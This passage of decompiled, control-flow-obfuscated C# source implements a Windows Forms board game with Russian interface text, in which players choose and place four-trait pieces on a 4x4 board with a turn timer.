using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -1147241017;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xEF89EFC8u) % 6u)
					{
					case 4u:
						Square = copy.Square;
						Point = copy.Point;
						num = (int)((num2 * 1911284483) ^ 0x65A8C32);
						continue;
					case 3u:
						Big = copy.Big;
						num = ((int)num2 * -1871067077) ^ -1474643329;
						continue;
					case 1u:
						num = (int)(num2 * 1303407066) ^ -1312778002;
						continue;
					case 0u:
						Dark = copy.Dark;
						num = (int)((num2 * 303382104) ^ 0x3DAD181F);
						continue;
					default:
						return;
					case 5u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_02f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fb: Expected O, but got Unknown
		int num3 = default(int);
		int num4 = default(int);
		double num8 = default(double);
		bool flag = default(bool);
		while (true)
		{
			int num = -141403863;
			while (true)
			{
				uint num2;
				double num5;
				switch ((num2 = (uint)num ^ 0x899201D0u) % 25u)
				{
				case 24u:
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -698292699) ^ -562127077;
					continue;
				case 23u:
				{
					int num13;
					if (num3 < 4)
					{
						num = -1891050902;
						num13 = -1891050902;
					}
					else
					{
						num = -1868146845;
						num13 = -1868146845;
					}
					continue;
				}
				case 21u:
					num3++;
					num = ((int)num2 * -776294489) ^ -1117569877;
					continue;
				case 20u:
					borderBox = new PictureBox[4, 4];
					num = ((int)num2 * -1987890014) ^ -75014591;
					continue;
				case 19u:
					num4 = 0;
					num = -1831843173;
					continue;
				case 18u:
					num = ((int)num2 * -1369986781) ^ 0x5A091743;
					continue;
				case 17u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = (int)((num2 * 1087674320) ^ 0x142341C6);
					continue;
				}
				case 16u:
					num4++;
					num = (int)((num2 * 1150831417) ^ 0x28BBEE0B);
					continue;
				case 15u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -971277463) ^ 0x514C1A63;
					continue;
				case 14u:
					if (num4 >= 2)
					{
						num = -1224512244;
						continue;
					}
					num5 = 0.0;
					goto IL_012e;
				case 13u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num3, num4]);
					num = ((int)num2 * -728073598) ^ 0x15CAFA18;
					continue;
				case 12u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num3, num4]);
					num = (int)((num2 * 234378378) ^ 0x4964B201);
					continue;
				case 11u:
				{
					PictureBox[,] array2 = borderBox;
					int num11 = num3;
					int num12 = num4;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num4 + num8) * (double)size), 1 + num3 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num11, num12] = obj2;
					num = ((int)num2 * -1886345020) ^ 0x3A0335DD;
					continue;
				}
				case 10u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -2019775053;
						num10 = -2019775053;
					}
					else
					{
						num9 = -33502282;
						num10 = -33502282;
					}
					num = num9 ^ ((int)num2 * -652457470);
					continue;
				}
				case 9u:
				{
					PictureBox[,] array = pictureBox;
					int num6 = num3;
					int num7 = num4;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num4 + num8) * (double)size), 4 + num3 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num6, num7] = obj;
					num = (int)(num2 * 287692108) ^ -1090951931;
					continue;
				}
				case 8u:
					num = (int)((num2 * 1966352176) ^ 0x1C51FD25);
					continue;
				case 7u:
					num3 = 0;
					num = ((int)num2 * -123383360) ^ -937309147;
					continue;
				case 6u:
					flag = num4 < 4;
					num = -1468762910;
					continue;
				case 5u:
					num5 = 4.1;
					goto IL_012e;
				case 4u:
					Form1.smethod_6((Control)(object)pictureBox[num3, num4], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)((num2 * 2018891503) ^ 0xE26376E);
					continue;
				case 3u:
					InitializeComponent();
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -458674763) ^ 0x29221667;
					continue;
				case 1u:
					num = ((int)num2 * -1591371435) ^ 0x61913760;
					continue;
				case 0u:
					num = ((int)num2 * -74996589) ^ 0x5550D15B;
					continue;
				default:
					return;
				case 22u:
					break;
				case 2u:
					return;
					IL_012e:
					num8 = num5;
					num = -108711006;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = 610417418;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7A4B217Du) % 3u)
				{
				case 1u:
					goto IL_0033;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0033:
				num = (int)(num2 * 1971687793) ^ -1572538986;
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -934149897;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x81AA50CAu) % 10u)
				{
				case 8u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -975048286) ^ 0x6677D22C;
					continue;
				}
				case 7u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -968773455) ^ -1428850638;
					continue;
				case 6u:
					num = -1746294042;
					continue;
				case 5u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -842985455) ^ 0x2BB64C05;
					continue;
				case 3u:
					num = ((int)num2 * -1438189426) ^ 0x2192C56E;
					continue;
				case 2u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) < 296)
					{
						num = -665882214;
						num3 = -665882214;
					}
					else
					{
						num = -772606679;
						num3 = -772606679;
					}
					continue;
				}
				case 1u:
					num = (int)((num2 * 1106168822) ^ 0x322EE779);
					continue;
				case 0u:
					num = (int)(num2 * 290611633) ^ -1914073946;
					continue;
				default:
					return;
				case 9u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = -1259033614;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAD1E1544u) % 19u)
				{
				case 18u:
				{
					int num6;
					if (num3 < 4)
					{
						num = -8668722;
						num6 = -8668722;
					}
					else
					{
						num = -1039600665;
						num6 = -1039600665;
					}
					continue;
				}
				case 17u:
					num = ((int)num2 * -47266609) ^ 0x65280488;
					continue;
				case 16u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = ((int)num2 * -131347677) ^ -1336993397;
					continue;
				case 15u:
					num3 = 0;
					num = ((int)num2 * -524217907) ^ 0x16324723;
					continue;
				case 14u:
					num4++;
					num = (int)((num2 * 463813677) ^ 0x1D67A251);
					continue;
				case 13u:
					num = -102680275;
					continue;
				case 11u:
					num = ((int)num2 * -2009815721) ^ -1423054589;
					continue;
				case 10u:
					num4 = 0;
					num = -349357181;
					continue;
				case 9u:
				{
					int num5;
					if (num4 < 4)
					{
						num = -1615342874;
						num5 = -1615342874;
					}
					else
					{
						num = -1259453934;
						num5 = -1259453934;
					}
					continue;
				}
				case 8u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					num = (int)((num2 * 250207742) ^ 0x176C6E8D);
					continue;
				case 7u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num = ((int)num2 * -1465068186) ^ -854611902;
					continue;
				case 6u:
					Paint_Storage();
					num = ((int)num2 * -2146616192) ^ -1898916870;
					continue;
				case 4u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1619310956) ^ -2010227838;
					continue;
				case 3u:
					num = ((int)num2 * -764634776) ^ 0x6B3681DE;
					continue;
				case 2u:
					num3++;
					num = ((int)num2 * -1197209945) ^ -252555446;
					continue;
				case 1u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1360677640) ^ -858894962;
					continue;
				case 0u:
					num = (int)((num2 * 677704217) ^ 0x2606F765);
					continue;
				default:
					return;
				case 12u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num8 = default(int);
		Graphics graphics_ = default(Graphics);
		int num9 = default(int);
		bool flag = default(bool);
		Brush brush_ = default(Brush);
		float num7 = default(float);
		float num10 = default(float);
		float num3 = default(float);
		bool square = default(bool);
		float num12 = default(float);
		bool dark = default(bool);
		float num4 = default(float);
		while (true)
		{
			int num = -2120636359;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF35820BEu) % 38u)
				{
				case 37u:
					num = (int)((num2 * 1828593092) ^ 0x25BE51FF);
					continue;
				case 36u:
					num8 = 0;
					num = -1235923237;
					continue;
				case 34u:
					num = (int)(num2 * 172775647) ^ -1142519069;
					continue;
				case 33u:
					num = ((int)num2 * -1246993348) ^ 0x5565461B;
					continue;
				case 32u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num9 = 0;
					num = (int)(num2 * 1295368976) ^ -632918284;
					continue;
				case 31u:
				{
					int num18;
					int num19;
					if (!flag)
					{
						num18 = 2083550885;
						num19 = 2083550885;
					}
					else
					{
						num18 = 1981806049;
						num19 = 1981806049;
					}
					num = num18 ^ (int)(num2 * 1799234536);
					continue;
				}
				case 30u:
					num = -100761893;
					continue;
				case 29u:
					brush_ = Form1.smethod_26();
					num = -695586156;
					continue;
				case 28u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1022819846) ^ 0x2183C514);
					continue;
				case 27u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1081896469) ^ -429937894;
					continue;
				case 26u:
					Form1.smethod_28(graphics_, brush_, num7 + (float)(num8 * size), num7 + (float)(num9 * size), num10, num10);
					num = ((int)num2 * -1517136241) ^ -1585859101;
					continue;
				case 25u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1716206520) ^ -2117313206;
					continue;
				case 24u:
					num3 = 1f;
					num = (int)((num2 * 558550705) ^ 0x6B505E5F);
					continue;
				case 23u:
					num8++;
					num = ((int)num2 * -63538748) ^ -1457959793;
					continue;
				case 22u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7 + (float)(num8 * size), num7 + (float)(num9 * size), num10, num10);
					num = (int)((num2 * 1792053780) ^ 0x72812FDD);
					continue;
				case 21u:
					num = -1507089932;
					continue;
				case 20u:
					num3 = 0.7f;
					num = -168665720;
					continue;
				case 19u:
					num9++;
					num = ((int)num2 * -947256834) ^ -1539766226;
					continue;
				case 17u:
				{
					int num20;
					int num21;
					if (board[num9, num8] != null)
					{
						num20 = -135188865;
						num21 = -135188865;
					}
					else
					{
						num20 = -796977431;
						num21 = -796977431;
					}
					num = num20 ^ ((int)num2 * -1445377225);
					continue;
				}
				case 16u:
					square = board[num9, num8].Square;
					num = (int)((num2 * 1619120102) ^ 0x27538049);
					continue;
				case 15u:
					num12 = (float)size * num3;
					num = ((int)num2 * -122919467) ^ 0x6C2D2B86;
					continue;
				case 14u:
				{
					int num16;
					int num17;
					if (!dark)
					{
						num16 = -1093159815;
						num17 = -1093159815;
					}
					else
					{
						num16 = -140961076;
						num17 = -140961076;
					}
					num = num16 ^ ((int)num2 * -87950333);
					continue;
				}
				case 13u:
					num = ((int)num2 * -298632181) ^ -798797309;
					continue;
				case 12u:
				{
					int num15;
					if (!board[num9, num8].Big)
					{
						num = -1136188376;
						num15 = -1136188376;
					}
					else
					{
						num = -2037936286;
						num15 = -2037936286;
					}
					continue;
				}
				case 11u:
					dark = board[num9, num8].Dark;
					num = (int)(num2 * 1337068522) ^ -1851482046;
					continue;
				case 10u:
				{
					num10 = num12 * 0.4f / (float)Form1.smethod_27(2.0);
					int num13;
					int num14;
					if (board[num9, num8].Point)
					{
						num13 = -229391134;
						num14 = -229391134;
					}
					else
					{
						num13 = -1108800721;
						num14 = -1108800721;
					}
					num = num13 ^ ((int)num2 * -1707984600);
					continue;
				}
				case 9u:
					num7 = (float)size * (num4 / 2f);
					num10 = num12 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 133314696) ^ -1696670916;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, brush_, num7 + (float)(num8 * size), num7 + (float)(num9 * size), num10, num10);
					num = -10474146;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num8 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -101915915;
					continue;
				case 6u:
				{
					int num11;
					if (num9 < 4)
					{
						num = -835986390;
						num11 = -835986390;
					}
					else
					{
						num = -2089348683;
						num11 = -2089348683;
					}
					continue;
				}
				case 5u:
					flag = num8 < 4;
					num = -1943006657;
					continue;
				case 4u:
					num4 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num7 = (float)size * (num4 / 2f);
					num = -724676714;
					continue;
				case 3u:
				{
					int num5;
					int num6;
					if (!square)
					{
						num5 = -852337784;
						num6 = -852337784;
					}
					else
					{
						num5 = -226751938;
						num6 = -226751938;
					}
					num = num5 ^ (int)(num2 * 1906541198);
					continue;
				}
				case 2u:
					num = ((int)num2 * -711060909) ^ 0x5043BA4A;
					continue;
				case 1u:
					num = ((int)num2 * -1557877361) ^ -2049087269;
					continue;
				case 0u:
					num4 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -960299245;
					continue;
				default:
					return;
				case 18u:
					break;
				case 35u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		float num4 = default(float);
		float num14 = default(float);
		int num8 = default(int);
		int num5 = default(int);
		bool dark = default(bool);
		float num13 = default(float);
		float num18 = default(float);
		bool flag = default(bool);
		bool point = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num3 = default(float);
		while (true)
		{
			int num = 430873812;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x66D17250u) % 37u)
				{
				case 36u:
					num4 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -686792129) ^ -1449747026;
					continue;
				case 35u:
				{
					int num17;
					if (!storage[num8, num5].Big)
					{
						num = 256462455;
						num17 = 256462455;
					}
					else
					{
						num = 1822113109;
						num17 = 1822113109;
					}
					continue;
				}
				case 34u:
					dark = storage[num8, num5].Dark;
					num = (int)((num2 * 1915491) ^ 0x4107ADDA);
					continue;
				case 33u:
					num13 = 1f - num18 * 0.9f / (float)Form1.smethod_27(2.0);
					num14 = (float)size * num18;
					num = 914290348;
					continue;
				case 32u:
					num = ((int)num2 * -44317221) ^ 0x76C4FAD9;
					continue;
				case 31u:
					num5++;
					num = 499556748;
					continue;
				case 30u:
					num = (int)((num2 * 1013407176) ^ 0x39984D09);
					continue;
				case 29u:
				{
					int num11;
					int num12;
					if (!dark)
					{
						num11 = 1332251552;
						num12 = 1332251552;
					}
					else
					{
						num11 = 975033248;
						num12 = 975033248;
					}
					num = num11 ^ (int)(num2 * 1085468739);
					continue;
				}
				case 28u:
					num = (int)((num2 * 1113592521) ^ 0x1C758DCB);
					continue;
				case 27u:
					num8++;
					num = (int)((num2 * 1786035504) ^ 0x60EB4BC9);
					continue;
				case 25u:
					flag = num5 < 4;
					num = 1749364149;
					continue;
				case 24u:
					point = storage[num8, num5].Point;
					num = (int)((num2 * 856114745) ^ 0x7145171D);
					continue;
				case 23u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num8, num5]));
					num = (int)((num2 * 1200769887) ^ 0x3FFD2713);
					continue;
				case 22u:
				{
					int num20;
					if (num8 < 4)
					{
						num = 942152700;
						num20 = 942152700;
					}
					else
					{
						num = 524549893;
						num20 = 524549893;
					}
					continue;
				}
				case 21u:
					Form1.smethod_20(pictureBox[num8, num5], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num8, num5]), Form1.smethod_16((Control)(object)pictureBox[num8, num5])));
					num = (int)((num2 * 1023151893) ^ 0x6C191FB9);
					continue;
				case 20u:
					num18 = 0.7f;
					num = 1407941796;
					continue;
				case 19u:
				{
					int num19;
					if (storage[num8, num5] != null)
					{
						num = 336270071;
						num19 = 336270071;
					}
					else
					{
						num = 518531467;
						num19 = 518531467;
					}
					continue;
				}
				case 18u:
					num8 = 0;
					num = (int)((num2 * 1912454886) ^ 0x2F3AF341);
					continue;
				case 17u:
					Form1.smethod_24(graphics_, brush_, num3, num3, num4, num4);
					num = 2135571915;
					continue;
				case 16u:
					num18 = 1f;
					num = ((int)num2 * -1030751323) ^ 0x38C2A99D;
					continue;
				case 15u:
					num13 = 1f - num18 * 0.4f / (float)Form1.smethod_27(2.0);
					num3 = (float)size * (num13 / 2f) - 4f;
					num = 602430551;
					continue;
				case 14u:
					num = (int)(num2 * 495169087) ^ -662501894;
					continue;
				case 13u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num5]);
					num = 2092759151;
					continue;
				case 12u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3, num3, num4, num4);
					num = ((int)num2 * -1484237080) ^ -695011835;
					continue;
				case 11u:
				{
					num3 = (float)size * (num13 / 2f) - 4f;
					num4 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					int num15;
					int num16;
					if (num5 < 2)
					{
						num15 = -1275533118;
						num16 = -1275533118;
					}
					else
					{
						num15 = -1638969157;
						num16 = -1638969157;
					}
					num = num15 ^ (int)(num2 * 2107380413);
					continue;
				}
				case 10u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -886782158;
						num10 = -886782158;
					}
					else
					{
						num9 = -844707238;
						num10 = -844707238;
					}
					num = num9 ^ (int)(num2 * 615199837);
					continue;
				}
				case 9u:
					num = (int)(num2 * 1019689753) ^ -858256494;
					continue;
				case 8u:
					num = (int)((num2 * 1990947530) ^ 0x4BB13DFD);
					continue;
				case 7u:
					brush_ = Form1.smethod_26();
					num = 199838673;
					continue;
				case 6u:
				{
					int num6;
					int num7;
					if (!point)
					{
						num6 = 1274064740;
						num7 = 1274064740;
					}
					else
					{
						num6 = 215873085;
						num7 = 215873085;
					}
					num = num6 ^ ((int)num2 * -2086013619);
					continue;
				}
				case 5u:
					num = ((int)num2 * -1186506677) ^ 0x4ACA0A80;
					continue;
				case 4u:
					num5 = 0;
					num = 671406170;
					continue;
				case 2u:
					num = ((int)num2 * -192969222) ^ 0x347505C9;
					continue;
				case 1u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -410848876) ^ -248717041;
					continue;
				case 0u:
					Form1.smethod_28(graphics_, brush_, num3, num3, num4, num4);
					num = ((int)num2 * -1217178331) ^ 0x243913BE;
					continue;
				default:
					return;
				case 26u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1670859121;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCD725B81u) % 26u)
				{
				case 25u:
					num3 = Form1.smethod_33(rnd, 4);
					num4 = Form1.smethod_33(rnd, 4);
					num = -1312202514;
					continue;
				case 24u:
					num5 = 0;
					num = -1861362325;
					continue;
				case 23u:
					num7++;
					num = ((int)num2 * -870944571) ^ -1174100216;
					continue;
				case 22u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -1933375309) ^ -767217296;
					continue;
				case 21u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)(num2 * 771727709) ^ -2147081320;
					continue;
				case 20u:
				{
					int num10;
					int num11;
					if (!turn)
					{
						num10 = 1587306636;
						num11 = 1587306636;
					}
					else
					{
						num10 = 676518759;
						num11 = 676518759;
					}
					num = num10 ^ ((int)num2 * -301639096);
					continue;
				}
				case 19u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -307475470;
					continue;
				case 18u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)((num2 * 835713315) ^ 0x774D763B);
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -77250900) ^ -1850348709;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)(num2 * 1594075938) ^ -670305820;
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1661689349) ^ -2134456442;
					continue;
				case 14u:
					num = (int)(num2 * 783396571) ^ -75263534;
					continue;
				case 11u:
					step = 0;
					num = ((int)num2 * -1495407452) ^ -925875169;
					continue;
				case 10u:
					num = ((int)num2 * -41158067) ^ 0x3179B194;
					continue;
				case 9u:
					num5++;
					num = (int)(num2 * 1404292478) ^ -213408271;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num5], bool_0: true);
					num = -961982350;
					continue;
				case 7u:
					num = ((int)num2 * -1260009491) ^ -71565864;
					continue;
				case 6u:
					num = (int)((num2 * 1422464318) ^ 0x14C92492);
					continue;
				case 5u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = -1670452487;
						num9 = -1670452487;
					}
					else
					{
						num8 = -897165702;
						num9 = -897165702;
					}
					num = num8 ^ (int)(num2 * 986600743);
					continue;
				}
				case 4u:
					flag = num7 < 4;
					num = -251082808;
					continue;
				case 3u:
					num7 = 0;
					num = (int)(num2 * 1751154304) ^ -1974736126;
					continue;
				case 2u:
				{
					int num6;
					if (num5 < 4)
					{
						num = -1313463539;
						num6 = -1313463539;
					}
					else
					{
						num = -2116763478;
						num6 = -2116763478;
					}
					continue;
				}
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Blue);
					num = ((int)num2 * -846160492) ^ -2065706221;
					continue;
				case 0u:
					num = (int)(num2 * 246266726) ^ -1981925436;
					continue;
				default:
					return;
				case 12u:
					break;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		int num12 = default(int);
		Point point = default(Point);
		int num3 = default(int);
		bool flag2 = default(bool);
		int num4 = default(int);
		int num14 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -559199812;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xBF951CB2u) % 20u)
				{
				case 19u:
					num12++;
					num = ((int)num2 * -860562953) ^ -972666160;
					continue;
				case 18u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num3 = point.Y / size;
					num = (int)((num2 * 1394704892) ^ 0x3914F62);
					continue;
				case 17u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -1865080618;
						num9 = -1865080618;
					}
					else
					{
						num8 = -150717845;
						num9 = -150717845;
					}
					num = num8 ^ ((int)num2 * -1028487114);
					continue;
				}
				case 16u:
					num4 -= 4;
					num = (int)(num2 * 913143698) ^ -164148586;
					continue;
				case 15u:
				{
					int num13;
					if (num12 >= 4)
					{
						num = -1919967265;
						num13 = -1919967265;
					}
					else
					{
						num = -1281016715;
						num13 = -1281016715;
					}
					continue;
				}
				case 13u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -1480533757) ^ 0x4D64357C;
					continue;
				case 12u:
					if (storage[num3, num4] != null)
					{
						num = -1437153476;
						continue;
					}
					num5 = 0;
					goto IL_00f9;
				case 11u:
					num14 = 0;
					num = -1810633036;
					continue;
				case 10u:
					flag3 = num14 < 4;
					num = -1680476989;
					continue;
				case 9u:
					num = ((int)num2 * -1407223326) ^ 0x3D8F5B22;
					continue;
				case 8u:
					Form1.smethod_5((Control)(object)borderBox[num12, num14], Color.White);
					num14++;
					num = -1810633036;
					continue;
				case 7u:
					num12 = 0;
					num = ((int)num2 * -1574716948) ^ -278971619;
					continue;
				case 6u:
					num4 = point.X / size;
					flag = num4 > 1;
					num = ((int)num2 * -485802101) ^ -1582739305;
					continue;
				case 5u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = -1868820457;
						num11 = -1868820457;
					}
					else
					{
						num10 = -1906545636;
						num11 = -1906545636;
					}
					num = num10 ^ ((int)num2 * -694406934);
					continue;
				}
				case 4u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -469410590) ^ -830492808;
					continue;
				case 3u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = -180891469;
						num7 = -180891469;
					}
					else
					{
						num6 = -1306664197;
						num7 = -1306664197;
					}
					num = num6 ^ (int)(num2 * 1007469823);
					continue;
				}
				case 2u:
					num5 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00f9;
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Red);
					num = ((int)num2 * -82296092) ^ 0x7DE62EB3;
					continue;
				default:
					return;
				case 0u:
					break;
				case 14u:
					return;
					IL_00f9:
					flag2 = (byte)num5 != 0;
					num = -1107860813;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		int num10 = default(int);
		int num11 = default(int);
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num5 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 914567820;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x5F2068D3u) % 28u)
				{
				case 27u:
					num10 = 0;
					num = 1317640130;
					continue;
				case 26u:
					num11++;
					num = ((int)num2 * -263551205) ^ -1088019794;
					continue;
				case 25u:
					num11 = 0;
					num = ((int)num2 * -592603293) ^ -308605889;
					continue;
				case 24u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -16781150) ^ -1471738594;
						continue;
					}
					num7 = 0;
					goto IL_0084;
				case 23u:
					num10++;
					num = 995490926;
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1988143203) ^ 0x39A4A80B;
					continue;
				case 21u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1710345994) ^ 0x6BE3C2D9;
					continue;
				case 20u:
					num = (int)((num2 * 1647732843) ^ 0x63ADB645);
					continue;
				case 18u:
					num = ((int)num2 * -844735304) ^ -1176802915;
					continue;
				case 16u:
					Paint_Board();
					num = ((int)num2 * -1604760840) ^ -1054651902;
					continue;
				case 15u:
					flag3 = num11 < 4;
					num = 915339989;
					continue;
				case 14u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = -1479974690;
						num14 = -1479974690;
					}
					else
					{
						num13 = -1959932358;
						num14 = -1959932358;
					}
